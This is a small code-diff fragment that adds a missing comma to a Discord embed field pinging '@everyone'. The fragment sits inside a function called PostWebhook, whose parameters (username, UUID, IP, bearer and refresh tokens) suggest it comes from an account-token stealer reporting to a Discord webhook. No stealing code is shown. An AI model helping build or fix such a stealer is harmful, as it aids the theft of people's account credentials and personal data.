@@ -307,7 +307,7 @@ async function PostWebhook(refresh, username, uuid, ip, BearerToken, RefreshToke
                 fields: [
                     {
                         name: "Ping",
-                        value: `@everyone`
+                        value: `@everyone`,
                         inline: true
                     },
                     {
